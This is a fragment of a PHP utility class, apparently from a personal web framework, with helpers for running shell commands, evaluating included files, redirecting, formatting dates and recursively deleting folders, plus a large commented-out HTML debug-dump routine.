    public static function execute ( $str )
    {
        exec ( $str , $output , $result );
        return $output;
    }
    
    /**Includes a file if that were physically where this function is called from.
     * Technically reading file and evaulating it.
     * The included file musn't use php short tags, and php close tag. Only one php block is allowed per include.
     *
     * @param      $fname
     * @param bool $auto_run
     *
     * @return bool|string
     */
    public static function include_physical ( $fname , $auto_run = TRUE )
    {
        if ( file_exist ( $fname ) === FALSE )
        {
            RETURN FALSE;
        }
        $code = file_get_contents ( $fname );
        if ( $auto_run === FALSE )
        {
            return $code;
        }
        eval ( str::keepafter_str ( "<?php" , $code ) );
        return $code;
    }
    
    public static function go2url ( $url = "./" )
    {
        header ( "location:" . $url );
        k_portal::portal ()->portal_abort ();
    }
    
    /**
     * self::MYDIE()
     *A better & nicer DIE and VAR_EXPORT combination
     *
     * @param mixed $data1
     * @param mixed $data2
     * @param mixed $data3
     * @param mixed $data4
     * @param mixed $data5
     * @param bool  $resurrection
     *
     * @return
     */
    
    
    /**
     * self::MYDIE()
     * A better & nicer DIE and VAR_EXPORT combination - in Norton Commander colors
     *
     * @param mixed
     *
     * @return
     */
    /*    public static function mydielike (  )
        {
          function lc_rdln ( $filename , $X , $radius = 0 )
          {
            $i        = 0;
            $from     = $X - $radius < 0 ? 0 : $X - $radius ;
            $to       = $X + $radius;
            $retlines = "";
            if ( ( $handle   = fopen ( $filename , "r" ) ) )
            {
              while ( ( $line = fgets ( $handle ) ) !== FALSE )
              {
                $i ++;
                if ( $i >= $from && $i <= $to )
                {
                  $i !== $X ? $retlines .= trim ( $line ) . "<br>" : $retlines .= "<b style='color:black;background-color:darkcyan'>" . trim ( $line ) . "</b>" . "<br>";
                  if ( $i === $to )
                  {
                    fclose ( $handle );
                    return "<span style='color:white'></span><br>" . $retlines . "<span style='color:white'></span><br>";
                  }
                }
              }
              fclose ( $handle );
              return "<br>" . $retlines . "<br>";
            }
            return "???";
          }
      
          IF ( ( $syspor = + function_exists ( "syslog_" ) & + class_exists ( "k_portal" ) ) === TRUE ) syslog_ ( "MYDIE called." );
        
          for ( $maxpad = $maxlev = $breakme = 0 , $i = 1 ; ( $i < 1000 && $breakme === 0 ) ; $i ++ , $maxlev ++ )
          {
            $maxpad += isset ( debug_backtrace ()[ $i ] ) === TRUE ? 1 : 0 +  $breakme ++ ;
          }
          for ( $breakme = 0 , $dbglevels = array () , $i = 1 ; ( $i < 1000 && $breakme === 0 ) ; $i ++ )
          {
            $padder = ($maxpad-$i)*20;
            $padderp = 5;
            for ( $lines = "" ,$k = 0 ; $k < 9 ; $k ++ )
            {
              $top = $k*18;
              $lines .= "<span style='opacity:0.7;color:cyan;position:absolute;left:{$padderp}px;top:{$top}px;'>" . ( debug_backtrace ()[ $i ][ 'line' ] + $k -6) . ":</span>";
            }
          
            $tocol = ( $i === 2 ) ?  "76359D" : "0060ff";
            $dbglevels[] = isset ( debug_backtrace ()[ $i ] ) === TRUE ? "<div style='border-left:{$padder}px solid #404040;position:relative;background-color:black;color:white;font-family:courier;font-size:16px'> yyy.)" . debug_backtrace ()[ $i ][ 'function' ] . " # " . debug_backtrace ()[ $i ][ 'line' ] . " # <span style='color:yellow' >" . pathinfo ( debug_backtrace ()[ $i ][ 'file' ] )[ "filename" ] . ".jsp"."</span></div><div style='border-left:{$padder}px solid #606060;font-weight:normal;background:linear-gradient(to right, #0000ff 0%,#$tocol 100%); ;color:#ffff00;font-family:courier;padding-left:100px;font-size:16px;position:relative;'>".lc_rdln( debug_backtrace ()[ $i ][ 'file' ]  , debug_backtrace ()[ $i ][ 'line' ] ,3 )."{$lines}</div>" : "  <" . ( __FILE__ ) . "jsp#" . __LINE__ . "__" . ( $breakme ++ ) . ">";
          }
          $style_div = "padding:5px;font-weight:normal;border:0px solid black !important;background-color: #ffffff !important;font-family:\"courier\" !important;color:white;font-size:14px !important;";
          print "<div style='COLOR:BLACK !IMPORTANT;$style_div' >";
          $str = implode ( getip(9) , str_replace ( "_once" , "" , array_reverse ( $dbglevels ) ) );
          for ( $j = 0 , $jp1 = 1 ; $j < $i + 1 ; $j ++ , $jp1 ++ )
          {
            //$str = str:: reotf ( "yyy.)" , "{$jp1}.)  " , $str );
            if (strpos($str,"yyy.") !==false )
            {
              $str      = explode ( "yyy.)" , $str );
              $str[ 0 ] .= "{$jp1}.)  ";
              $str      = implode ( "yyy.)" , $str );
              $str      = str_replace ( "{$jp1}.)  yyy.)" , "{$jp1}.)  " , $str );
            }
          }
          $str = str:: reotf ( "=>" , "" , $str );
          if (strpos($str,"=>") !==false )
          {
            $str = explode ( "=>" , $str );
            $rnd      = mt_rand ( 1 , 30000 );
            $str[ 0 ] .= $rnd;
            $str      = implode ( "=>" , $str );
            $str      = str_replace ( "=>" . $rnd , "" , $str );
          }
          print $str . "<br>";
          mt_srand(303);
          for ( $i = 0 , $breakme = FALSE , $tmpcnt = func_num_args() ; ( $i < $tmpcnt && $breakme === FALSE ) ; $i ++ )
          {
            $data1 = func_get_args()[$i];
            $r = mt_rand(0,100);
            $g = mt_rand(0,100);
            $b = mt_rand(0,100);
            $randomcolor = "rgb( $r,$g,$b )";
            print "<div style='COLOR:WHITE !IMPORTANT;{$style_div};background-color: $randomcolor !important;' \">\n\n";
            print ( "<pre style='font-family:courier;font-size:16px'>" . str_replace ( " => <br>\n" , " => " , htmlspecialchars ( var_export ( $data1  , true) ) ) . "</pre>" );
            print "\n\n</div>";
          }
        }
      
        public static function mydie ( )
        {
        
          static $mydie_call_num = 0 ;
          $mydie_call_num ++ ;
          if ( $mydie_call_num > 1 )
          {
            die ( strtoupper ( __METHOD__ ) . ": recursion detected, aborting." . "<br><br><pre>" . var_dump2 ( k_portal::portal() ) . "</pre>" );
          }
          self:: mydielike ( func_get_args ( ) ) ;
          k_portal :: portal ( ) -> portal_abort ( ) ;
        }
    */
    
    /*
        public static function cryptme ( $s , $k = 'this.indexOf($(this).charAt(i++)' )
      {
        return bin2hex ( self :: rc4 ( $k . "" , $s . "" ) );
      }
    */
    
    //function cryptme($s,  $k='this.indexOf($(this).charAt(i++)')    { return bin2hex(rc4($k."",$s."")); }
    
    
    //  function cryptme ( $s , $k='this.indexOf($(this).charAt(i++)')    { return bin2hex(rc4($k."",$s."")); }
    
    
    /**
     * idt()
     *
     * @param string $dt
     * @param string $str
     * @param string $lang
     *
     * @return
     */
    //  function idt( $dt="",$str="YY. mm DD.",$lang="hu")
    //  {
    //    return insertdatetime($dt,$str,$lang);
    //  }
    
    public static function idt ( $format = NULL , $time = NULL , $lang = "hu" )
    {
        static $idt_format = "Y.m.d";
        if ( $format === NULL && $time === NULL )
        {
            $format = $idt_format;
            $time   = time2 ();
        }
        elseif ( istimestamp ( $format ) === TRUE )
        {
            $time   = $format;
            $format = $idt_format;
        }
        $time = $time ?? time2 ();
        $date = DateTime::createFromFormat ( "U" , ( istimestamp ( $time ) === TRUE ? $time : time2 () ) );
        return $date->format ( $format );
    }
    
    /**
     * @param null   $format
     * @param null   $time
     * @param string $lang
     *
     * @return string
     */
    public static function idtfull ( $format = NULL , $time = NULL , $lang = "hu" )
    {
        return static::idt ( $format ?? "Y.m.d H:i:s" , $time , $lang );
        
        //    return idt ( "Y.m.d H:i:s
        //    static $idt_format = "Y.m.d" ;
        //    if ( $format === NULL && $time === NULL ) {
        //      $format = $idt_format;
        //      $time   = time2 ();
        //    }
        //    elseif ( istimestamp ( $format ) === TRUE ) {
        //      $time   = $format;
        //      $format = $idt_format;
        //    }
        //    $time = $time ?? time2() ;
        //    $date = DateTime::createFromFormat( "U" , ( istimestamp (  $time ) === TRUE ? $time : time2 () ) )  ;
        //    return $date->format( $format );
    }
    
    
    //  function idtfull( $format="Y.m.d H:i:s" , $time = NULL ,$lang="hu")
    //  {
    //    $time = $time ?? time2() ;
    //    $date = istimestamp (  $time ) ? DateTime::createFromFormat( "U" , time2() ) : " :-( " ;
    //    return $date->format( $format );
    //  }
    
    public static function rmdir ( $folderName , bool $keepRootFolder )
    {
        $dir = opendir ( $folderName );
        while ( FALSE !== ( $file = readdir ( $dir ) ) )
        {
            if ( ( $file != '.' ) && ( $file != '..' ) )
            {
                if ( is_dir ( $folderName . '/' . $file ) )
                {
                    self::rmdir ( $folderName . '/' . $file , $keepRootFolder);
                }
                else
                {
                    unlink ( $folderName . '/' . $file );
                }
            }
        }
        closedir ( $dir );
        $keepRootFolder ? self::nop () : rmdir ( $folderName );
        
    }
    
    
}





